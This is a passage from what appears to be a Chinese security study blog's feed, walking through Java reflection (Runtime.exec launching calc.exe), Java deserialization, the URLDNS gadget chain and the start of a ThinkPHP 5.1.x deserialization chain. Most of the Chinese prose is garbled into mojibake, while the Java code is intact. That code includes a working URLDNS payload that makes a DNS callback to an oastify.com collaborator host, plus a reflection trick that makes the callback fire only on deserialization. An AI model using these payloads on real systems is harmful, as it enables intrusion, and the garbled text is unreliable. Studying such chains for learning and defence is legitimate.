‡è®°ä¸ºä½¿ç”¨å®ƒæŠ‘åˆ¶æ‘¸äººJavaè®¿é—®æ§åˆ¶æ£€æŸ¥çš„åŠŸèƒ½ï¼ŒåŒæ—¶ä¸Šè¿°çš„åå°„ç±»ä¸­çš„Fieldï¼ŒMethodå’ŒConstructorç»§æ‰¿è‡ªAccessibleObjectã€‚æ‰€ä»¥æˆ‘ä»¬åœ¨è¿™äº›ç±»æ–¹æ³•åŸºç¡€ä¸Šè°ƒç”¨setAccessible()æ–¹æ³•ï¼Œæ—¢å¯å¯¹è¿™äº›ç§æœ‰å­—æ®µè¿›è¡Œæ“ä½œã€‚</p></blockquote><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.lang.reflect.Constructor;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">RuntimeTest</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        Class c1= Class.forName(<span class="string">&quot;java.lang.Runtime&quot;</span>);</span><br><span class="line">        <span class="type">Constructor</span> <span class="variable">m</span> <span class="operator">=</span> c1.getDeclaredConstructor();</span><br><span class="line">        m.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        c1.getMethod(<span class="string">&quot;exec&quot;</span>, String.class).invoke(m.newInstance(), <span class="string">&quot;C:\\WINDOWS\\System32\\calc.exe&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è¿™é‡Œæˆ‘å¹¶æ²¡æœ‰æˆåŠŸå¼¹è®¡ç®—å™¨, ä¸çŸ¥é“æ˜¯ä¸æ˜¯jdkç‰ˆæœ¬çš„é—®é¢˜</p><p>æ¢æˆjdk1.8è¿™é‡Œå°±å¯ä»¥äº†</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240309112318876.png" alt="image-20240309112318876"></p><h1 id="ååºåˆ—åŒ–"><a href="#ååºåˆ—åŒ–" class="headerlink" title="ååºåˆ—åŒ–"></a>ååºåˆ—åŒ–</h1><p><strong>åºåˆ—åŒ–</strong>: ObjectOutputStream.WriteObject</p><p><strong>ååºåˆ—åŒ–</strong>: ObjectInputStream.readObject</p><blockquote><p>åªæœ‰å®ç° äº†Serializable æˆ–è€… Externalizable æ¥å£çš„ç±»çš„å¯¹è±¡æ‰èƒ½è¢«åºåˆ—åŒ–ä¸ºå­—èŠ‚åºåˆ—</p><p>Serializable æ¥å£æ˜¯ Java æä¾›çš„åºåˆ—åŒ–æ¥å£,ä¸€ä¸ªå®ç° Serializable æ¥å£çš„å­ç±»ä¹Ÿæ˜¯å¯ä»¥è¢«åºåˆ—åŒ–çš„ã€‚</p></blockquote><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.n4c1.www;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Test</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">Useri</span> <span class="variable">user</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Useri</span>(<span class="string">&quot;n4c1&quot;</span>, <span class="number">19</span>);</span><br><span class="line">        System.out.println(user);</span><br><span class="line">        Serialize(user);</span><br><span class="line"></span><br><span class="line">        Unserialize();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">Serialize</span><span class="params">(Useri obj)</span> <span class="keyword">throws</span>  Exception &#123;</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">oos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(<span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;ser.txt&quot;</span>));</span><br><span class="line">        oos.writeObject(obj);</span><br><span class="line">        oos.close();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">Unserialize</span><span class="params">()</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">ois</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">FileInputStream</span>(<span class="string">&quot;ser.txt&quot;</span>));</span><br><span class="line">        <span class="type">Object</span> <span class="variable">obj</span> <span class="operator">=</span> ois.readObject();</span><br><span class="line">        System.out.println(<span class="string">&quot;unserialized:&quot;</span>);</span><br><span class="line">        System.out.println(obj);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Useri</span> <span class="keyword">implements</span> <span class="title class_">Serializable</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> String username;</span><br><span class="line">    <span class="keyword">private</span> <span class="type">int</span> age;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">Useri</span><span class="params">(String username, <span class="type">int</span> age)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.username = username;</span><br><span class="line">        <span class="built_in">this</span>.age = age;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">toString</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;User&#123;&quot;</span> + username + <span class="string">&#x27;\&#x27;&#x27;</span> +</span><br><span class="line">                <span class="string">&quot;, age=&quot;</span> + age +</span><br><span class="line">                <span class="string">&#x27;&#125;&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>transient</strong></p><p>transient æ ‡è¯†çš„å¯¹è±¡æˆå‘˜å˜é‡ä¸å‚ä¸åºåˆ—åŒ–</p><h3 id="æ¼æ´æˆå› "><a href="#æ¼æ´æˆå› " class="headerlink" title="æ¼æ´æˆå› "></a>æ¼æ´æˆå› </h3><p>å¯ä»¥çœ‹è§ååºåˆ—åŒ–å, ä¼šè‡ªåŠ¨è°ƒç”¨readObject()æ–¹æ³•(åœ¨phpä¸­åˆ™æ˜¯__wakeupè¿™æ ·çš„æ–¹æ³•), è€Œå¦‚æœç¨‹åºå¯¹readObject()è¿›è¡Œäº†é‡å†™, å¹¶æ·»åŠ äº†ä¸€äº›å±é™©æ“ä½œ, å°±ä¼šåœ¨ååºåˆ—åŒ–åè‡ªåŠ¨è¿›è¡Œè¿™äº›ä¸ªå±é™©æ“ä½œ, </p><h3 id="å…¥å£ç±»"><a href="#å…¥å£ç±»" class="headerlink" title="å…¥å£ç±»"></a>å…¥å£ç±»</h3><blockquote><p>å…¥å£ç±»ä¸€èˆ¬æ˜¯<code>Map,Hashmap,HashTable</code>è¿™äº›é›†åˆç±»ï¼Œå› ä¸ºé›†åˆç±»å‹å®½æ³›ï¼ˆæ³›å‹ï¼‰ï¼Œå› æ­¤è‚¯å®šç»§æ‰¿äº†<code>Serializeable</code>æ¥å£ï¼Œåœ¨<code>Hashmap</code>ç±»ä¸­ä¹Ÿé‡å†™äº†<code>readObject</code>æ–¹æ³•</p></blockquote><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240309195913040.png" alt="image-20240309195913040"></p><p>ä¸ºä»€ä¹ˆé‡å†™?</p><blockquote><p>HashMapä¸­ï¼Œç”±äºEntryçš„å­˜æ”¾ä½ç½®æ˜¯æ ¹æ®Keyçš„Hashå€¼æ¥è®¡ç®—ï¼Œç„¶åå­˜æ”¾åˆ°æ•°ç»„ä¸­çš„ï¼Œå¯¹äºåŒä¸€ä¸ªKeyï¼Œåœ¨ä¸åŒçš„JVMå®ç°ä¸­è®¡ç®—å¾—å‡ºçš„Hashå€¼å¯èƒ½æ˜¯ä¸åŒçš„ã€‚<br>Hashå€¼ä¸åŒå¯¼è‡´çš„ç»“æœå°±æ˜¯ï¼šæœ‰å¯èƒ½ä¸€ä¸ªHashMapå¯¹è±¡çš„ååºåˆ—åŒ–ç»“æœä¸åºåˆ—åŒ–ä¹‹å‰çš„ç»“æœä¸ä¸€è‡´ã€‚å³æœ‰å¯èƒ½åºåˆ—åŒ–ä¹‹å‰ï¼ŒKey&#x3D;â€™AAAâ€™çš„å…ƒç´ æ”¾åœ¨æ•°ç»„çš„ç¬¬0ä¸ªä½ç½®ï¼Œè€Œååºåˆ—åŒ–å€¼åï¼Œæ ¹æ®Keyè·å–å…ƒç´ çš„æ—¶å€™ï¼Œå¯èƒ½éœ€è¦ä»æ•°ç»„ä¸º2çš„ä½ç½®æ¥è·å–ï¼Œè€Œæ­¤æ—¶è·å–åˆ°çš„æ•°æ®ä¸åºåˆ—åŒ–ä¹‹å‰è‚¯å®šæ˜¯ä¸åŒçš„</p></blockquote><h3 id="URLDNS"><a href="#URLDNS" class="headerlink" title="URLDNS"></a>URLDNS</h3><p>ä»¥ysoserialä¸­çš„URLDNSä½œä¸ºä¸€ä¸ªä¾‹å­</p><p><a href="https://github.com/frohoff/ysoserial">https://github.com/frohoff/ysoserial</a></p><p>ä¸Šé¢å·²ç»çœ‹è§äº†hashMapå¯¹readObjectçš„é‡å†™, é‡ç‚¹å…³æ³¨ä»¥ä¸‹å†…å®¹, åœ¨readObjectçš„æœ€å, è°ƒç”¨çš„putVal</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240309201854085.png" alt="image-20240309201854085"></p><p>é¦–å…ˆè·Ÿè¿›hashå‡½æ•°</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240309202142278.png" alt="image-20240309202142278"></p><p>è¿™é‡Œè°ƒç”¨äº†key.hashCode(), è€ŒObject keyæ˜¯å¯æ§çš„, å› æ­¤å°±å¯ä»¥è°ƒç”¨å¯æ§ç±»ä¸‹çš„hashCode()æ–¹æ³•</p><p>ç°åœ¨è½¬å‘URLç±»</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240309203605526.png" alt="image-20240309203605526"></p><p>æˆ‘ä»¬å‘ç°URLç±»ä¸‹ä¹Ÿæœ‰ä¸€ä¸ªhashCodeæ–¹æ³•, å› æ­¤å¦‚æœæˆ‘ä»¬å°†å¯æ§ç±»ä¼ å…¥ä¸ºä¸€ä¸ªURLå¯¹è±¡, è¿™é‡Œçš„hashCodeå°±ä¼šè¢«è°ƒç”¨</p><p>ä½†æ˜¯è¿™é‡Œå­˜åœ¨ä¸€ä¸ªhashCodeå€¼çš„åˆ¤æ–­, å½“å…¶ä¸ä¸º-1æ—¶ç›´æ¥è¿”å›hashCode</p><p>å¥½åœ¨å…¶é»˜è®¤å€¼ä¸º-1, ä¹Ÿå°±æ˜¯è¯´è¿™é‡Œä¼šè½¬åˆ°hashCode &#x3D; handler.hashCode(this);</p><p>ç»§ç»­è·Ÿè¿›</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240309204051582.png" alt="image-20240309204051582"></p><p>è§‚å¯Ÿç¬¬367è¡Œ</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">InetAddress</span> <span class="variable">addr</span> <span class="operator">=</span> getHostAddress(u);</span><br></pre></td></tr></table></figure><p>è¿™æ˜¯ä¸€ä¸ªè·å–ä¸»æœºåœ°å€çš„å‡½æ•°</p><p>å› æ­¤, å¦‚æœæˆ‘ä»¬ä¼ å…¥ä¸€ä¸ªvpsçš„urlåœ°å€, è¿™é‡Œå°±ä¼šè§¦å‘ä¸€æ¬¡å¯¹æˆ‘ä»¬vpsåœ°å€çš„è§£æ, </p><p>å€˜è‹¥vpsæ”¶åˆ°è¿™ä¸ªè§£æ, å°±èƒ½å¤Ÿè¯æ˜ååºåˆ—åŒ–æ¼æ´çš„å­˜åœ¨</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.net.URL;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Main</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException &#123;</span><br><span class="line">        HashMap&lt;URL, Integer&gt; hashmap=  <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        hashmap.put(<span class="keyword">new</span> <span class="title class_">URL</span>(<span class="string">&quot;http://t0umcddst9nwg1a9c7tk7xcdc4iv6mub.oastify.com&quot;</span>), <span class="number">1</span>);</span><br><span class="line">        serialize(hashmap);</span><br><span class="line">        <span class="type">Object</span> <span class="variable">obj</span> <span class="operator">=</span> unserialize();</span><br><span class="line">        System.out.println(<span class="string">&quot;obj&quot;</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">serialize</span><span class="params">(Object obj)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">oos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(<span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;seria.bin&quot;</span>));</span><br><span class="line">        oos.writeObject(obj);</span><br><span class="line">        oos.close();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title function_">unserialize</span><span class="params">()</span> <span class="keyword">throws</span> IOException, ClassNotFoundException &#123;</span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">ois</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">FileInputStream</span>(<span class="string">&quot;seria.bin&quot;</span>));</span><br><span class="line">        <span class="type">Object</span> <span class="variable">obj</span> <span class="operator">=</span> ois.readObject();</span><br><span class="line">        ois.close();</span><br><span class="line">        <span class="keyword">return</span> obj;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>æœ‰è¶£çš„æ˜¯è¿™é‡Œåºåˆ—åŒ–æ—¶ä¹Ÿä¼šå‘èµ·ä¸€ä¸ªdnsè¯·æ±‚</p><p>è°ƒè¯•çœ‹çœ‹</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240309213620334.png" alt="image-20240309213620334"></p><p>è·Ÿè¿›putæ–¹æ³•</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240309213725383.png" alt="image-20240309213725383"></p><p>ä¸‹ä¸€æ­¥ç›´æ¥è°ƒç”¨äº†putVal ä¸”keyå°±æ˜¯æˆ‘ä»¬è¦è§£æçš„URL</p><p>æ‰€ä»¥, åœ¨åºåˆ—åŒ–æ—¶ä¹Ÿä¼šå‘èµ·ä¸€æ¬¡dnsè§£æ</p><p>å†è°ƒè¯•ååºåˆ—åŒ–, ä¹Ÿä¼šæ‰§è¡Œåˆ°è¿™é‡Œ</p><p>å› æ­¤å°±æ— æ³•åˆ¤æ–­å“ªä¸€ä¸ªè¯·æ±‚æ˜¯æ¥è‡ªååºåˆ—åŒ–</p><p>æ­¤æ—¶å°±è¦å¼•å…¥ä¸Šé¢æåˆ°çš„åå°„</p><p>é€šè¿‡åå°„, åœ¨putæ—¶å°†hashCodeçš„å€¼è®¾ç½®ä¸º-1, ä»è€Œä¸æ‰§è¡Œåé¢çš„ä¸€ç³»åˆ—æ–¹æ³•, åœ¨æ­¤ä¹‹å, åˆå°†hashCodeè®¾ç½®ä¸ºå…¶ä»–æ•°å­—, ä½¿å…¶åœ¨ååºåˆ—åŒ–æ—¶åˆèƒ½å¤Ÿè§¦å‘dnsè¯·æ±‚</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.net.URL;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Main</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException, NoSuchFieldException, IllegalAccessException &#123;</span><br><span class="line">        HashMap&lt;URL, Integer&gt; hashmap=  <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        <span class="type">URL</span> <span class="variable">url</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">URL</span>(<span class="string">&quot;http://t0umcddst9nwg1a9c7tk7xcdc4iv6mub.oastify.com&quot;</span>);</span><br><span class="line">        <span class="type">Class</span> <span class="variable">c1</span> <span class="operator">=</span> url.getClass();</span><br><span class="line">        <span class="type">Field</span> <span class="variable">hashcode</span> <span class="operator">=</span> c1.getDeclaredField(<span class="string">&quot;hashCode&quot;</span>);</span><br><span class="line">        hashcode.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        hashcode.set(url, <span class="number">123</span>); <span class="comment">// ä¿®æ”¹urlä¸­çš„hashcodeä¸ºé-1</span></span><br><span class="line">        hashmap.put(url, <span class="number">1</span>);</span><br><span class="line">        hashcode.set(url, -<span class="number">1</span>);</span><br><span class="line">        <span class="comment">//hashmap.put(new URL(&quot;http://t0umcddst9nwg1a9c7tk7xcdc4iv6mub.oastify.com&quot;), 1);</span></span><br><span class="line">        serialize(hashmap);</span><br><span class="line">       <span class="comment">// Object obj = unserialize();</span></span><br><span class="line">        <span class="comment">//System.out.println(&quot;obj&quot;);</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">serialize</span><span class="params">(Object obj)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">oos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(<span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;seria.bin&quot;</span>));</span><br><span class="line">        oos.writeObject(obj);</span><br><span class="line">        oos.close();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title function_">unserialize</span><span class="params">()</span> <span class="keyword">throws</span> IOException, ClassNotFoundException &#123;</span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">ois</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">FileInputStream</span>(<span class="string">&quot;seria.bin&quot;</span>));</span><br><span class="line">        <span class="type">Object</span> <span class="variable">obj</span> <span class="operator">=</span> ois.readObject();</span><br><span class="line">        ois.close();</span><br><span class="line">        <span class="keyword">return</span> obj;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>æ­¤æ—¶,åºåˆ—åŒ–æ—¶å°±ä¸ä¼šäº§å‡ºdnsè¯·æ±‚, è€Œååºåˆ—åŒ–æ—¶ä¼šå‘èµ·dns</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;JavaåŸºç¡€è¯­æ³•&quot;&gt;&lt;a href=&quot;#JavaåŸºç¡€è¯­æ³•&quot; class=&quot;headerlink&quot; title=&quot;JavaåŸºç¡€è¯­æ³•&quot;&gt;&lt;/a&gt;JavaåŸºç¡€è¯­æ³•&lt;/h1&gt;&lt;h2 id=&quot;SOUTå’ŒSOUFè¾“å‡º&quot;&gt;&lt;a href=&quot;#SOUTå’ŒSOUFè¾“å‡º&quot; class</summary>
      
    
    
    
    
    <category term="Javaå®‰å…¨" scheme="http://example.com/tags/Java%E5%AE%89%E5%85%A8/"/>
    
  </entry>
  
  <entry>
    <title>ThinkPHP 5.1.xååºåˆ—åŒ–</title>
    <link href="http://example.com/2024/03/04/ThinkPHP-5-1-x%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"/>
    <id>http://example.com/2024/03/04/ThinkPHP-5-1-x%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/</id>
    <published>2024-03-04T14:28:24.000Z</published>
    <updated>2024-03-06T09:23:39.418Z</updated>
    
    <content type="html"><![CDATA[<h1 id="ThinkPHP-5-1-xååºåˆ—åŒ–"><a href="#ThinkPHP-5-1-xååºåˆ—åŒ–" class="headerlink" title="ThinkPHP 5.1.xååºåˆ—åŒ–"></a>ThinkPHP 5.1.xååºåˆ—åŒ–</h1><p>æˆ‘ä»¬å·²ç»å­¦ä¹ äº†phpååºåˆ—åŒ–çš„åŸºç¡€æ“ä½œ,ä½†è¿™è¿œè¿œä¸å¤Ÿ</p><p> å‰ä¸ä¹…åœ¨æ¯”èµ›ä¸­é‡åˆ°è¿‡å‡ æ¬¡thinkPHPååºåˆ—åŒ–çš„é¢˜ç›®, è®©äººæ‘¸ä¸ç€å¤´è„‘, æœ€è¿‘åˆåœ¨å¤§ä½¬åšå®¢ä¸­æ— æ„é—´åˆ·åˆ°äº†è¿™éƒ¨åˆ†å†…å®¹, åœ¨è¿™é‡Œè¿›è¡Œå­¦ä¹ </p><p>å‚è€ƒ: <a href="https://boogipop.com/2023/03/02/ThinkPHP5.x%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%85%A8%E5%A4%8D%E7%8E%B0/#%E4%B8%89%E3%80%81ThinkPHP5-1-x%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%93%BE">https://boogipop.com/2023/03/02/ThinkPHP5.x%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%85%A8%E5%A4%8D%E7%8E%B0/#%E4%B8%89%E3%80%81ThinkPHP5-1-x%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%93%BE</a></p><h2 id="ç¯å¢ƒæ­å»º"><a href="#ç¯å¢ƒæ­å»º" class="headerlink" title="ç¯å¢ƒæ­å»º:"></a>ç¯å¢ƒæ­å»º:</h2><ol><li>php7.2.34nts(phpstudy)</li><li>thinkPHP5.1.34</li></ol><h2 id="è¸©å‘"><a href="#è¸©å‘" class="headerlink" title="è¸©å‘"></a>è¸©å‘</h2><p>é¦–å…ˆå°±æ˜¯tp5.1.34çš„å®‰è£…, å‡ æ¬¡ä»ç½‘ä¸Šä¸‹è½½éƒ½ä¸æˆåŠŸ,æœ€ç»ˆæ–¹æ³•æ˜¯:</p><p>åœ¨phpstudyçš„composer2.5.8</p><p>åœ¨ç»ˆç«¯æ‰“å¼€composer2.5.8çš„ç›®å½•è¾“å…¥</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">composer create-project topthink/think=5.1.* tp5_1_37</span><br></pre></td></tr></table></figure><p>ä¸‹è½½åè¿›å…¥tpçš„ç›®å½•</p><p>æŠŠâ€topthink&#x2F;frameworkâ€: â€œ5.1.*â€æ”¹æˆâ€topthink&#x2F;frameworkâ€: â€œ5.1.37â€</p><p>ä¹‹å</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">composer update</span><br></pre></td></tr></table></figure><h2 id="å¤ç°"><a href="#å¤ç°" class="headerlink" title="å¤ç°"></a>å¤ç°</h2><h3 id="é“¾å­"><a href="#é“¾å­" class="headerlink" title="é“¾å­"></a>é“¾å­</h3><p><strong>é¦–å…ˆè·Ÿä¸€éå¦‚ä½•æ‰¾é“¾å­</strong></p><p>ç”±ä¹‹å‰æ‰€å­¦çš„çŸ¥è¯†å¯ä»¥æ‰¾åˆ°, phpååºåˆ—åŒ–æœ€å¸¸è§çš„å…¥å£å°±æ˜¯<code>__destruct()</code>å’Œ<code>__wakeup()</code>å…¶ä¸­æœ€å¸¸è§çš„å°±å±<code>__destruct()</code></p><p>è¿™é‡Œä¹Ÿæ­£æ˜¯åˆ©ç”¨<code>__destruct()</code>ä½œä¸ºå…¥å£</p><p>é¦–å…ˆseayå…¨å±€æŸ¥æ‰¾<code>__destruct()</code></p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240304224653354.png" alt="image-20240304224653354"></p><p>æˆ‘ä»¬è¦ä½¿ç”¨çš„å°±æ˜¯<strong>think\process\pipes\Windows</strong> ç±»çš„ <strong>__destruct</strong> </p><p>å…¶ç›®å½•ä½ç½®: <strong>&#x2F;thinkphp&#x2F;library&#x2F;think&#x2F;process&#x2F;pipes&#x2F;Windows.php</strong></p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240304225102324.png" alt="image-20240304225102324"></p><p>è·Ÿè¿›removeFiles()è¿™ä¸ªå‡½æ•°</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240304225229060.png" alt="image-20240304225229060"></p><p>è¿™é‡Œè°ƒç”¨äº†ä¸€ä¸ª**file_exists($filename)**å‡½æ•°, æœ‰è¶£çš„æ˜¯è¿™é‡Œçš„æ–‡ä»¶å <strong>$filename</strong> å˜é‡æ˜¯å¯æ§ã€‚å¦‚æœæˆ‘ä»¬å°†ä¸€ä¸ªç±»èµ‹å€¼ç»™ <strong>$filename</strong> å˜é‡ï¼Œé‚£ä¹ˆåœ¨ <strong>file_exists($filename)</strong> çš„æ—¶å€™ï¼Œå°±ä¼šè§¦å‘è¿™ä¸ªç±»çš„ <strong>__toString</strong> æ–¹æ³•ã€‚</p><p>å…¨å±€æœç´¢**__toString()**æ–¹æ³•</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240304225657758.png" alt="image-20240304225657758"></p><p>è¿™é‡Œé€‰ç”¨<strong>think&#x2F;concern&#x2F;Conversion</strong>ç±»</p><p>ç›®å½•è·¯å¾„: 